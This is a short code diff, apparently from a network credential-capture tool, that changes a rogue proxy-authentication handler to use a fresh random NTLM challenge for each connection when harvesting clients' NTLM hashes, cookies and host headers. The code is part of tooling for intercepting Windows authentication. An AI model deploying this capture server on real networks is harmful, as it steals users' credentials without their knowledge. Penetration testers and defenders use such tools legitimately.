@@ -47,7 +47,7 @@ def GrabHost(data):
 		return Host
 	return False
 
-def PacketSequence(data, client):
+def PacketSequence(data, client, Challenge):
 	NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
 	Basic_Auth = re.findall(r'(?<=Authorization: Basic )[^\r]*', data)	
 	if NTLM_Auth:
@@ -56,14 +56,14 @@ def PacketSequence(data, client):
 			if settings.Config.Verbose:
 				print text("[Proxy-Auth] Sending NTLM authentication request to %s" % client)
 
-			Buffer = NTLM_Challenge(ServerChallenge=settings.Config.Challenge)
+			Buffer = NTLM_Challenge(ServerChallenge=Challenge)
 			Buffer.calculate()
 			Buffer_Ans = WPAD_NTLM_Challenge_Ans()
 			Buffer_Ans.calculate(str(Buffer))
 			return str(Buffer_Ans)
 		if Packet_NTLM == "\x03":
 			NTLM_Auth = b64decode(''.join(NTLM_Auth))
-       	                ParseHTTPHash(NTLM_Auth, client, "Proxy-Auth")
+       	                ParseHTTPHash(NTLM_Auth, Challenge, client, "Proxy-Auth")
                         GrabUserAgent(data)
                         GrabCookie(data)
                         GrabHost(data)
@@ -101,9 +101,10 @@ class Proxy_Auth(SocketServer.BaseRequestHandler):
 
     def handle(self):
 		try:
+                    Challenge = RandomChallenge()
                     for x in range(2):
                         data = self.request.recv(4096)
-                        self.request.send(PacketSequence(data, self.client_address[0]))
+                        self.request.send(PacketSequence(data, self.client_address[0], Challenge))
 
 		except:
                    	pass
